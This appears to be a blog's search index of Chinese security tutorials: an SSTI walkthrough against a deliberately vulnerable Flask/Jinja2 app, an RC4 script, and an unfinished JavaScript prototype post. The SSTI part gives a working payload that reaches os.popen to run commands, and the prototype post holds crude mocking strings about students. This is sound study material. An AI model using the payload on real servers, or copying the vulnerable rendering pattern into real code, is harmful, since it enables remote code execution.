<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SSTI原理解析</title>
      <link href="/2025/11/24/ssti%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/"/>
      <url>/2025/11/24/ssti%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>SSTI(Server-Side Template Injection)，服务端模板注入。</p><h2 id="一、预备知识"><a href="#一、预备知识" class="headerlink" title="一、预备知识"></a>一、预备知识</h2><h3 id="1-模板引擎"><a href="#1-模板引擎" class="headerlink" title="1.模板引擎"></a>1.模板引擎</h3><p>模板引擎(特指web端的模板引擎)是为了分离用户界面和业务数据产生的，通过生成特定格式的文档，利用模板引擎生成前端的html代码，只需要获取用户数据放入渲染函数里即可生成模板+用户数据的前端页面呈现给用户浏览器。</p><h2 id="2-SSTI"><a href="#2-SSTI" class="headerlink" title="2.SSTI"></a>2.SSTI</h2><p>现如今的一些框架，像<code>python的flask</code>，<code>php的thinkphp</code>，<code>java的spring</code>等一般都是使用成熟MVC模式：</p><ol><li>用户的输入先进入Controller控制器</li><li>根据请求类型和请求指令发送到对应Model业务模型进行业务逻辑判断和数据库存取</li><li>将结果返回到View视图层，经过模板渲染后展现给用户</li></ol><p>而SSTI漏洞成因就是因为服务端接收用户输入后，未做任何处理就将其作为Web应用模板内容的一部分，模板引擎进行目标编译渲染时，执行了用户输入的恶意语句，从而导致敏感信息泄露、RCE、getshell等问题。</p><h2 id="二、常见SSTI问题"><a href="#二、常见SSTI问题" class="headerlink" title="二、常见SSTI问题"></a>二、常见SSTI问题</h2><h3 id="1-python中的ssti-jinja2"><a href="#1-python中的ssti-jinja2" class="headerlink" title="1.python中的ssti-jinja2"></a>1.python中的ssti-jinja2</h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ssti&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ssti_view</span>():</span><br><span class="line">    user_input = request.args.get(<span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    template_code = <span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;div style=&quot;text-align: center; margin-top: 50px; font-family: sans-serif;&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h3&gt;Hello, <span class="subst">&#123;user_input&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template_code)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/ssti%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2025_11_24_1.png"></p><p><img src="/img/ssti%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2025_11_24_2.png"></p><p>此时默认的模板解释参数为guest，分析代码可知此时服务端的运行逻辑是接收前端输入的input参数，将其返回到后端拼接后返回前端进行展示</p><p>两种主要的模板渲染函数：</p><p><code>render_template()</code>: 用于渲染一个指定的模板文件；</p><p><code>render_template_string()</code>: 用于渲染一个作为输入的字符串</p><p>Jinja2模板引擎使用双大括号<code>&#123;&#123; &#125;&#125;</code>作为变量包裹标识符，当模板函数（尤其是在使用字符串作为模板的场景）进行渲染时，它会把<code>&#123;&#123; &#125;&#125;</code>包裹起来的内容当作变量或表达式进行解析替换。</p><p>模板注入漏洞的成因就是渲染函数在渲染时，往往<strong>不会对用户输入的变量做渲染</strong>，而是直接替换。然而，如果用户输入的数据包含了 Jinja2 的变量包裹标识符<code>&#123;&#123;&#125;&#125;</code>，那么用户输入的内容就会被解析执行。(像 <code> 2*2</code> 被解析成 <code>4</code> )</p><p><img src="/img/ssti%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2025_11_24_3.png"></p><h4 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h4><p>在 Python 中，所有类都默认或显式地继承自一个基类，即内置的 <code>object</code> 类。SSTI 攻击利用的就是 Python 模板引擎在渲染用户输入时，用户可以通过一系列魔术方法进行“类继承链漫游”，最终找到一个可以执行系统命令或读取文件的危险函数&#x2F;模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>(<span class="title class_ inherited__">a</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span>(<span class="title class_ inherited__">b</span>):<span class="keyword">pass</span></span><br><span class="line">c = c()</span><br><span class="line"><span class="built_in">print</span>(c.__class__)<span class="comment">#__class__:找到它的当前类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__)<span class="comment">#__base__:找到当前类的父类，也就是b类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__)<span class="comment">#a类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__base__)<span class="comment">#a类的父类，object类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__)<span class="comment">#包含所有父类的元组，与 __base__ 类似，但可以获取多个父类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">3</span>])<span class="comment">#加上下标就能拿到指定的类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">3</span>].__subclasses__())<span class="comment">#返回一个列表，包含所有直接继承自该类的子类。这是关键，因为通过它，可以从object遍历到所有当前运行环境中加载的类，包括含有我们RCE所需的函数/模块的类</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Running</span>] python <span class="literal">-u</span> <span class="string">&quot;d:\desktop\src\code\CTF\tempCodeRunnerFile.py&quot;</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;__<span class="title">main__</span>.<span class="title">c</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">b</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">a</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">(&lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">c</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">b</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">a</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">[&lt;<span class="title">class</span> &#x27;<span class="title">type</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">async_generator</span>&#x27;&gt;, ...</span></span><br></pre></td></tr></table></figure><p><img src="/img/ssti%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2025_11_24_4.png"></p><p>在这串代码里面，创建了a、b、c三个类，c类继承b类，b类继承a类，a类默认继承object类。</p><p>这里读取object类的子类的时候，输出不换行，而且检索比较麻烦，这里写了一个通用脚本来给输出进行换行和编号，便于我们找到指定的类。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">subclasses_string = (</span><br><span class="line">    <span class="string">&quot;&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, ..., &lt;class &#x27;__main__.a&#x27;&gt;&quot;</span>)<span class="comment">#这里替换输出</span></span><br><span class="line">pattern = <span class="string">r&quot;&lt;class\s+.*?&gt;&quot;</span></span><br><span class="line">class_list = re.findall(pattern, subclasses_string)</span><br><span class="line"></span><br><span class="line">output_filename = <span class="string">&quot;subclasses.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_filename, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        output_content = <span class="string">&quot;\n&quot;</span>.join(class_list)</span><br><span class="line">        f.write(output_content)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;成功将 <span class="subst">&#123;<span class="built_in">len</span>(class_list)&#125;</span> 个子类信息输出到文件：<span class="subst">&#123;output_filename&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;文件内容一个类占一行。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;写入文件 <span class="subst">&#123;output_filename&#125;</span> 时发生错误。请检查文件权限。&quot;</span>)</span><br></pre></td></tr></table></figure><p>检索输出得到的信息，找我们能拿来进行RCCE的类，这里就给出一个类&lt;class ‘os._wrap_close’&gt;，索引是170，但是首位是0，所以应该是列表的第169个。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>(<span class="title class_ inherited__">a</span>):<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">c</span>(<span class="title class_ inherited__">b</span>):<span class="keyword">pass</span></span><br><span class="line">c = c()</span><br><span class="line"><span class="built_in">print</span>(c.__class__)<span class="comment">#__class__:找到它的当前类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__)<span class="comment">#__base__:找到当前类的父类，也就是b类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__)<span class="comment">#a类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__base__.__base__.__base__)<span class="comment">#a类的父类，object类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__)<span class="comment">#包含所有父类的元组，与 __base__ 类似，但可以获取多个父类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">3</span>])<span class="comment">#加上下标就能拿到指定的类</span></span><br><span class="line"><span class="comment">#print(c.__class__.__mro__[3].__subclasses__())</span></span><br><span class="line"><span class="comment"># #返回一个列表，包含所有直接继承自该类的子类。这是关键，因为通过它，可以从object遍历到所有当前运行环境中加载的类，包括含有我们RCE所需的函数/模块的类</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">3</span>].__subclasses__()[<span class="number">169</span>])</span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">3</span>].__subclasses__()[<span class="number">169</span>].__init__)</span><br><span class="line"><span class="comment">#__init__ 返回一个函数对象,获取一个可以访问__globals__ 字典的跳板，从而访问到内置函数集__builtins__</span></span><br><span class="line"><span class="comment">#print(c.__class__.__mro__[3].__subclasses__()[169].__init__.__globals__)</span></span><br><span class="line"><span class="comment">#很多全局变量都在里面，我们需要进行rce，就要找到能执行系统命令的方法。这里用popen函数来执行系统命令</span></span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">3</span>].__subclasses__()[<span class="number">169</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span>(c.__class__.__mro__[<span class="number">3</span>].__subclasses__()[<span class="number">169</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read())</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[<span class="type">Running</span>] python <span class="literal">-u</span> <span class="string">&quot;d:\desktop\src\code\CTF\python_class.py&quot;</span></span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;__<span class="title">main__</span>.<span class="title">c</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">b</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">a</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">(&lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">c</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">b</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;__<span class="title">main__</span>.<span class="title">a</span>&#x27;&gt;, &lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;)</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">os</span>._<span class="title">wrap_close</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> _<span class="title">wrap_close</span>.__<span class="title">init__</span> <span class="title">at</span> 0<span class="title">x000001C4097E1010</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">popen</span> <span class="title">at</span> 0<span class="title">x000001C4097E0EB0</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">wolf</span>\<span class="title">admin</span></span></span><br></pre></td></tr></table></figure><p>通过找到指定的类之后，攻击链通常是类—-类的构造函数—-构造函数所处的模块全局变量，所以需要__init__作为跳板，来获得__globals__ 字典。</p><p>这里执行命令要用 read()方法来读取数据，因为popen函数会执行传入的 shell 命令，并返回一个文件对象，而不是我们需要的命令回显数据。</p><p>最后可以看到成功执行命令，这也是一般ssti的攻击思路。</p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h4><p>总结一下常用的的魔术方法</p><table><thead><tr><th><strong>属性&#x2F;方法</strong></th><th><strong>返回值</strong></th></tr></thead><tbody><tr><td><code>.__class__</code></td><td>对象的类</td></tr><tr><td><code>.__base__</code></td><td>类的直接父类</td></tr><tr><td><code>.__bases__</code></td><td>所有直接父类的元组</td></tr><tr><td><code>.__mro__</code></td><td>方法解析顺序元组</td></tr><tr><td><code>.__subclasses__()</code></td><td>继承自该类的所有子类的列表</td></tr><tr><td><code>.__init__</code></td><td>类的构造函数</td></tr><tr><td><code>.__globals__</code></td><td>函数所在模块的全局命名空间</td></tr><tr><td><code>[&#39;__builtins__&#39;]</code></td><td>Python 的内置函数集</td></tr><tr><td><code>.__import__()</code></td><td>Python 的导入函数</td></tr></tbody></table><h4 id="SSTI注入"><a href="#SSTI注入" class="headerlink" title="SSTI注入"></a>SSTI注入</h4><p><img src="/img/ssti%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/2025_11_24_5.png"></p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">169</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;whoami&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>我们不知道有哪些现成的类，可以用’’.__class__或者””.__class__，返回的就是&lt;class ‘str’&gt;，此时访问父类就是object。</p><p>(其他类型有待更新…)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>收集一个rc4加密的脚本</title>
      <link href="/2025/11/24/rc4%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC/"/>
      <url>/2025/11/24/rc4%E5%8A%A0%E5%AF%86%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = <span class="built_in">str</span>(rc4_excrypt(message, s_box))</span><br><span class="line">    <span class="keyword">return</span>  crypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)) </span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">str</span>(base64.b64encode(cipher.encode(<span class="string">&#x27;utf-8&#x27;</span>)), <span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&quot;请输入密钥:\n&quot;</span>)<span class="comment">#&quot;HereIsTreasure&quot;</span></span><br><span class="line">message = <span class="built_in">input</span>(<span class="string">&quot;请输入明文:\n&quot;</span>)</span><br><span class="line">enc_base64 = rc4_main( key , message )</span><br><span class="line">enc_init = <span class="built_in">str</span>(base64.b64decode(enc_base64),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">enc_url = parse.quote(enc_init)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;rc4加密后的url编码:&quot;</span>+enc_url)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>原型链污染-概念解析</title>
      <link href="/2025/11/23/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
      <url>/2025/11/23/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
      
        <content type="html"><![CDATA[<p>JavaScript语言的继承不通过class，而是通过<strong>原型对象</strong>（prototype）实现。</p><h2 id="一、构造函数"><a href="#一、构造函数" class="headerlink" title="一、构造函数"></a>一、构造函数</h2><p>JavaScript通过构造函数来生成新对象，构造函数相当于模板的作用。实例对象的属性和方法定义在构造函数中。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">student</span>(<span class="params">name, ID</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">ID</span> = <span class="variable constant_">ID</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> student1 = <span class="keyword">new</span> <span class="title function_">student</span>(<span class="string">&quot;cyt&quot;</span>, <span class="string">&quot;20231&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> student2 = <span class="keyword">new</span> <span class="title function_">student</span>(<span class="string">&quot;zpc&quot;</span>, <span class="string">&quot;20232&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student1.<span class="property">ID</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student2.<span class="property">name</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(student2.<span class="property">ID</span>)</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_1.png"></p><p>这样通过构造函数给实例对象定义属性和方法是比较方便的。</p><p>但是这样会使得同一个构造函数的多个实例对象无法共享属性，那么在每一次生成新的实例对象时，这些对象之间本可以共享的属性都会重新进行一次内存分配并存储，造成资源的浪费。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function student(name, ID)</span><br><span class="line">&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.ID = ID;</span><br><span class="line">  this.saysex = function()&#123;</span><br><span class="line">    console.log(&quot;I&#x27;m Gay.&quot;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var student1 = new student(&quot;cyt&quot;, &quot;20231&quot;)</span><br><span class="line">var student2 = new student(&quot;zpc&quot;, &quot;20232&quot;)</span><br><span class="line"></span><br><span class="line">console.log(student1.saysex === student2.saysex)</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_2.png"></p><p>可以看到这里输出的false，因为进行比较的时候是比较这两个对象的内存地址，内存不一样说明两次分配内存是独立的，造成了资源的浪费，因为每一个实例对象的操作都是一样的。</p><h2 id="二、prototype-原型对象"><a href="#二、prototype-原型对象" class="headerlink" title="二、prototype-原型对象"></a>二、prototype-原型对象</h2><p>JavaScript通常被描述为一种<strong>基于原型</strong>的语言，即每一个对象都有一个原型对象。JavaScript的继承机制是原型对象的所有属性与方法，都被实例对象共享。原型是一块共享内存区域，存放各实例的共享元素。</p><p>JavaScript规定，每一个函数对象都有一个prototype属性，指向一个对象。对于普通函数几乎没用，对于构造函数，在生成新的实例对象时，该属性会自动成为实例对象的原型。</p><p>这里注意几点：</p><ol><li>原型对象的属性不是实例对象的属性，修改原型对象的属性，所有的实例对象也会变动。</li><li>如果实例对象有某个属性或者方法，则不会再去原型对象寻找。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function student(name, ID)</span><br><span class="line">&#123;</span><br><span class="line">  this.name = name;</span><br><span class="line">  this.ID = ID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">student.prototype.weight = &quot;Big fat&quot;</span><br><span class="line"></span><br><span class="line">student.prototype.saysex = function()&#123;</span><br><span class="line">  console.log(this.name + &quot; is Gay.&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var student1 = new student(&quot;cyt&quot;, &quot;20231&quot;)</span><br><span class="line">var student2 = new student(&quot;zpc&quot;, &quot;20232&quot;)</span><br><span class="line"></span><br><span class="line">console.log(student1.weight)</span><br><span class="line">console.log(student2.weight)</span><br><span class="line">student1.saysex()</span><br><span class="line">student2.saysex()</span><br><span class="line"></span><br><span class="line">student1.weight = &quot;thin and thin&quot;</span><br><span class="line"></span><br><span class="line">console.log(student1.weight)</span><br><span class="line">console.log(student2.weight)</span><br><span class="line"></span><br><span class="line">student.prototype.weight = &quot;not fat&quot;</span><br><span class="line"></span><br><span class="line">console.log(student1.weight)</span><br><span class="line">console.log(student2.weight)</span><br></pre></td></tr></table></figure><p><img src="/img/XSS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/2025_11_22_3.png"></p><h2 id="三、原型链"><a href="#三、原型链" class="headerlink" title="三、原型链"></a>三、原型链</h2><h4 id="1-原型链基本概念"><a href="#1-原型链基本概念" class="headerlink" title="1.原型链基本概念"></a>1.原型链基本概念</h4><p>每个对象都有自己的原型对象，原型对象也是一个对象，也有自己的原型对象，这会形成一个原型链。</p><ol><li>当试图访问对象的某个属性时，会先在对象内部查找，没有就往原型查找，没有就接着往上，直到找到或者找到原型链的末尾，还是找不到返回<strong>undefined</strong>。</li><li>一层一层的往上查找，找到最后会找到<strong>Object.prototype</strong>，也就是Object的prototype属性，这也是为什么所有的对象都有<strong>valueOf</strong>方法和<strong>toString</strong>方法的原因。</li><li>Object.prototype的原型对象是<strong>null</strong>，null没有属性和方法，没有自己的原型对象，也是原型链的末尾。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 